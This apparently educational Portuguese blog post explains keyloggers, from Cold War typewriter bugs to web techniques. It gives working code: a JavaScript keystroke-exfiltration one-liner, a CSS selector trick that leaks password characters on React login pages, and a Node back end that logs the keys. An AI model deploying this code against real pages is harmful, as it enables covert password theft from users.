---
layout: post
title: Keyloggers
description: "O que são, para que servem, e como fazer um?"
tags: [keylogger, spyware, web, beginner]
author: mavellar
published: true
image:
  background: triangular.png
---

### O que são, para que servem, e como fazer um?
Uma das ferramentas potencialmente maliciosas mais bem conhecidas na área de computação é o *keylogger*. Um keylogger é um programa (ou dispositivo) que detecta quando alguma tecla é pressionada no teclado e, de uma maneira ou de outra, guarda essa informação — seja para uso futuro pelo próprio usuário ou não.

É importante notar que um keylogger não necessariamente é um spyware, isto é, um programa para espionar no usuário sem consentimento. O nome *keylogger* se refere somente à funcionalidade da ferramenta e não ao seu uso.

Um dos primeiros casos famosos de keylogging ocorreu em 1984, quando a embaixada americana em Moscou descobriu que pelo menos 16 máquinas de escrever possuíam pequenos dispositivos implantados. Esses dispositivos eram capazes de detectar teclas sendo pressionadas e, em seguida, transmitir essa informação por meio de ondas de rádio para agentes soviéticos no lado de fora do prédio. Esse achado resultou no início do GUNMAN Project, um projeto ultrassecreto cujo objetivo era encontrar qualquer vulnerabilidade em equipamentos de telecomunicação da embaixada de Moscou.

Keyloggers físicos como os de Moscou, impossíveis de detectar por software, ainda estão em uso. Porém, eles vão além do escopo deste artigo. Aqui, vamos dar uma olhada somente em keyloggers de software.
## Event-based
O conceito de programar *event-based* é: esperar algo acontecer e, quando acontecer, executar algum código. No caso de um keylogger, nosso "evento" é a tecla sendo pressionada.

Especificamente para Windows, podemos criar uma aplicação no Visual Studio em C# ou Visual Basic que se utiliza da API nativa do Windows para detecção de pressionamento de teclas. Para Linux, podemos utilizar C e / ou Bash. Links para exemplos de ambos estão no final do artigo.

Aqui, entretanto, vamos focar nossos exemplos nas aplicações para web / node, por serem independentes do sistema operacional.
## Usando JavaScript
O código a seguir, em JavaScript, envia teclas pressionadas em uma página para uma URL arbitrária — nesse caso, "http://localhost":

{% highlight js %}
addEventListener("keyup",e=>new Image().src="//localhost?"+e.key)
{% endhighlight %}

Inicialmente, [ele cria um novo 'listener'](https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener) de evento, que espera o evento de "[key up](https://developer.mozilla.org/en-US/docs/Web/Events/keyup)", isto é, o evento que é emitido quando o usuário pressiona e depois solta uma tecla. O segundo argumento é a função de *callback*, que contém o código que será executado quando o evento ocorrer.

Nessa função, que recebe um objeto "`e`" como argumento, criamos uma nova 'imagem' e definimos o URL dela para `"//localhost?" + e.key` — se recebemos a tecla "J", o URL será "http://localhost?J". Assim que a 'imagem' é criada pelo JavaScript, o navegador envia uma requisição para o URL para obter a suposta imagem. Com isso, podemos processar a informação enviada quando ela for recebida pelo servidor e, assim, guardá-la em um log.

<figure class="half center">
   <a href="{{ site.url }}/images/2018-05-13-9WXL7If.png"><img src="{{ site.url }}/images/2018-05-13-9WXL7If.png" alt="Fig. 1: Exemplo demonstrando o keylogger em JavaScript sendo executado em uma página de login. À direita, o terminal mostra que todas as teclas pressionadas na página estão sendo recebidas pelo servidor."></a>
  <figcaption>Fig. 1: Exemplo demonstrando o keylogger em JavaScript sendo executado em uma página de login. À direita, o terminal mostra que todas as teclas pressionadas na página estão sendo recebidas pelo servidor.</figcaption>
</figure>

Como tudo, um keylogger em JavaScript tem seus prós e contras. Para um indivíduo mal intencionado, pode não ser muito fácil conseguir que um usuário de interesse execute código JavaScript em uma página de login. Portanto, alguma outra vulnerabilidade, seja ela de infraestrutura ou social, deverá ser abusada para que o código seja executado onde deve. Porém, a vantagem é que, após criado, o keylogger é praticamente perfeito no que faz. Toda e qualquer tecla pressionada será registrada e enviada para o servidor. No caso que veremos a seguir, isso nem sempre acontece.
## Usando CSS – pera, quê?
Intuitivamente, pode-se imaginar que é necessário executar algum código para criar um keylogger — pelo menos eu tinha essa ideia até não muito tempo atrás. Mas isso não necessariamente é verdade! Algumas linguagens, como CSS e SVG, não são exatamente consideradas programação por não serem [Turing-Complete](https://stackoverflow.com/a/37247136/4824627). Ainda assim, podemos abusar algumas features delas para alcançar nosso objetivo.

Para fazer um keylogger com CSS, usaremos um efeito colateral de alguns frameworks e bibliotecas de JavaScript, como o React. Mas, antes disso, darei uma mini-aula de input de usuário em HTML:

Normalmente, quando se tem um elemento em HTML do tipo "`<input>`" (em que o usuário pode inserir conteúdo em texto), o programador pode adicionar um atributo "*value*" que define um valor padrão, que já vai estar escrito no input quando o site carregar. Quando o usuário insere algum texto no input, o conteúdo definido no atributo "*value*" não é atualizado, e simplesmente para de ser usado.

Voltando ao React: o site do Instagram usa React por trás dos panos. Isso faz com que o atributo "*value*" seja [atualizado a cada caractere inserido](https://reactjs.org/docs/forms.html#controlled-components) pelo usuário! E, novamente, isso vale tanto para o campo de username, quanto para o campo de senha! Aqui vai uma screenshot:

<figure class="half center">
  <a href="{{ site.url }}/images/2018-05-13-HvAUUAN.png"><img src="{{ site.url }}/images/2018-05-13-HvAUUAN.png" alt="Fig. 2: Página de login do Instagram, com email e senha inseridos (note que a senha está oculta). À direita, na janela de Developer Tool, tanto email quanto senha estão expostos em texto plano no atributo 'value'."></a>
  <figcaption>Fig. 2: Página de login do Instagram, com email e senha inseridos (note que a senha está oculta). À direita, na janela de Developer Tool, tanto email quanto senha estão expostos em texto plano no atributo "value".</figcaption>
</figure>

O CSS não é poderoso o suficiente para capturar o evento de teclas sendo pressionadas. Contudo, ele consegue ver os atributos de HTML e seus conteúdos! Então, se quisermos, por exemplo, colorir todos os inputs que contém um "*value*" de "banana", podemos fazer:

{% highlight css %}
input[value="banana"] {
    color: red;
}
{% endhighlight %}

Sabendo da maneira como o React e o CSS funcionam, podemos criar um keylogger para sites que usam o React, como o Instagram, ou que atualizam o atributo "*value*". Definimos regras como:

{% highlight css %}
input[type="password"][value$="A"] {
    list-style: url("http://localhost?A");
}
{% endhighlight %}

Onde `input[type="password"]` seleciona somente `<input>`'s que possuam o atributo `type="password"`, e `[value$="A"]` seleciona somente `<input>`'s cujo atributo value [termina](https://developer.mozilla.org/en-US/docs/Web/CSS/Attribute_selectors) em `A`.

Similarmente como acontece no exemplo de JavaScript, definimos um URL para ser requisitado pelo CSS, que será nosso meio de enviar a informação para o servidor. No caso, usamos a propriedade *list-style*, que não afeta esse elemento visualmente.

Repetindo essa regra para todos os caracteres relevantes, terminamos com um arquivo com 90+ linhas de código e um resultado não muito impressionante, mas suficientemente funcional:

<figure class="half center">
  <a href="{{ site.url }}/images/2018-05-13-TQJAhby.png"><img src="{{ site.url }}/images/2018-05-13-TQJAhby.png" alt="Fig. 3: Exemplo demonstrando o keylogger em CSS em funcionamento em um página de login. À direita, o terminal mostra que as teclas pressionadas no input de senha estão sendo recebidas pelo servidor."></a>
  <figcaption>Fig. 3: Exemplo demonstrando o keylogger em CSS em funcionamento em um página de login. À direita, o terminal mostra que as teclas pressionadas no input de senha estão sendo recebidas pelo servidor.</figcaption>
</figure>

Comparado ao keylogger em JavaScript, esse é claramente mais verboso e pesado: dos 56 bytes de código adicionados ao tamanho da URL, em JavaScript, partimos para quase 5000 bytes de 'código' adicionados ao tamanho da URL repetida 90 ou mais vezes, em CSS. Além disso, estamos presos a teclas cujos caracteres podem ser inseridos no input (teclas como F5, Ctrl, Shift, Backspace, passam despercebidas), o que não ocorre em JavaScript.

Ademais (uau que palavra linda), tive um problema estranho com o keylogger em CSS: teclas repetidas não eram enviadas novamente. Então, uma senha como "banana" se torna "ban", o final "ana" não é enviado por só conter caracteres que já foram testados. Acredito que isso seja devido a alguma otimização do CSS, para que ele não tente requisitar várias vezes a mesma página. Contudo, apesar de meus — admitidamente poucos — esforços para evitar um cache e forçar uma requisição repetida, não consegui consertar esse erro.

Temos, entretanto, a pequena vantagem de que é mais fácil carregar CSS sorrateiramente do que JavaScript. Extensões como [Stylish](https://chrome.google.com/webstore/detail/fjnbnpbmkenffdnngjfgmeleoegfcffe) permitem ao usuário adicionar estilos customizados feitos por terceiros e, muitas vezes, o usuário não tem conhecimento de CSS, então não sabe o que está adicionando.
## Criando o back-end
Desenvolvi um back-end bem simples para essa aplicação, por ser somente um *proof-of-concept*. Todo o código está disponível no GitHub (links no final do artigo), mas aqui vai um resumo:

{% highlight js %}
// Primeiro, fazemos alguns requires de módulos para criarmos um servidor web simples
const app = require("express")();
const fs = require("fs");
const http = require("http").Server(app);

// Em seguida, definimos o que rola ao requisitar o URL /listen:
app.get("/listener", function(req, res) {

    // Se recebemos uma tecla no URL,
    if(req._parsedUrl.search) {
        // Definimos que a tecla, k, é o que vem após '?' no URL, usando .slice:
        let k = req._parsedUrl.search.slice(1);

        // Decodificamos, se necessário (e.x.: %5B equivale a '[')
        if(k.charAt(0) == '%' && k != "%")
            k = decodeURIComponent(k);
        // E recuperamos a tecla do espaço, que pode ser perdida na requisição
        else if(k.length == 0)
            k = " ";

        // Para maior legibilidade, todas as teclas que não têm
        // somente um caractere, envolvemos em "<" e ">"
        // (por exemplo, <Del> ou <F5>)
        if(k.length > 1)
            k = "<" + k + ">";

        // Adicionamos a string da tecla ao final do arquivo de log
        fs.appendFile("./log.txt", k, function(err) {
            if(err) throw err;
        });
    }
    // E, por fim, retornamos um status de 304 - Not Modified
    res.sendStatus(304);
});

// Terminamos abrindo o servidor na porta 3000
http.listen(3000, function(){ console.log("Listening on *:3000\n") });

{% endhighlight %}
## Conclusão
O tópico de keyloggers é muito mais extenso do que eu poderia tentar cobrir em um post somente. Nesse artigo, vimos somente a ponta do iceberg sobre o assunto, com exemplos bem simples e restritos. Porém, se tudo correu bem, espero que você, querido leitor, tenha adquirido algum conhecimento com isso tudo.

Para aprender mais sobre keyloggers, abaixo estão as referências e links recomendados.

Mas, antes, deixo um fato que você não pediu sobre algo que você não se interessa:

> Avestruzes não têm dentes e, portanto, engolem pedras (chamadas gastrólitos) para ajudar com a digestão. <sup>[[ref 1]](http://www.dinosaurhunter.org/files/app-2007-wings-gastrolith_function_classification.pdf) [[ref 2]](http://www.dinosaurhunter.org/files/wings_2003_-_ostrich_gastrolith_release.pdf) [[ref 3]](https://www.ncbi.nlm.nih.gov/pubmed/17254987)</sup>

## Referências

Todo código utilizado neste artigo está disponível em: [https://github.com/MatheusAvellar/gris-blog](https://github.com/MatheusAvellar/gris-blog)

Caso do incidente com a embaixada americana e suas máquinas de escrever com keyloggers:
- [wikipedia.org](https://en.wikipedia.org/wiki/IBM_Selectric_typewriter#Eavesdropping)
- [arstechnica.com](https://arstechnica.com/information-technology/2015/10/how-soviets-used-ibm-selectric-keyloggers-to-spy-on-us-diplomats/)

Informações sobre o GUNMAN Project:
- [rijmenants.blogspot.com.br](https://rijmenants.blogspot.com.br/2012/11/the-gunman-project.html)
- [nsa.gov (PDF)](https://www.nsa.gov/about/cryptologic-heritage/historical-figures-publications/publications/assets/files/gunman-project/Learning_From_the_Enemy_The_GUNMAN_Project.pdf)

"Detecting Hardware Keyloggers":
- [conference.hackinthebox.org (PDF)](http://conference.hackinthebox.org/hitbsecconf2010kul/materials/D1T1%20-%20Fabian%20Mihailowitsch%20-%20Detecting%20Hardware%20Keyloggers.pdf)

Código para um keylogger em C# (.NET), para Windows:
 - [stackoverflow.com (❤)](https://stackoverflow.com/a/604417/4824627)

E em VB (também .NET):
- [codeguru.com](https://www.codeguru.com/vb/controls/creating-a-simple-keylogger-in-visual-basic.html)

Código para um keylogger em C e Bash, para Linux:
- [github.com](https://github.com/kernc/logkeys)

"TouchLogger: Inferring Keystrokes On Touch Screen From Smartphone Motion":
- [usenix.org (PDF)](https://www.usenix.org/legacy/events/hotsec11/tech/final_files/Cai.pdf)

Keylogger que se utiliza apenas do acelerômetro do celular para detectar as teclas sendo pressionadas em um teclado apoiado em uma mesma mesa:
- [wired.com](https://www.wired.com/2011/10/iphone-keylogger-spying/)

Apresentação sobre ataques que não utilizam linguagens Turing-Complete (scriptless):
- [slideshare.net](https://www.slideshare.net/x00mario/stealing-the-pie)

Um dos primeiros keyloggers, de 1985, feito em C:
- [securitydigest.org](http://securitydigest.org/unix/archive/006)

Referência para o keylogger em CSS:
- [github.com](https://github.com/maxchehab/CSS-Keylogging)
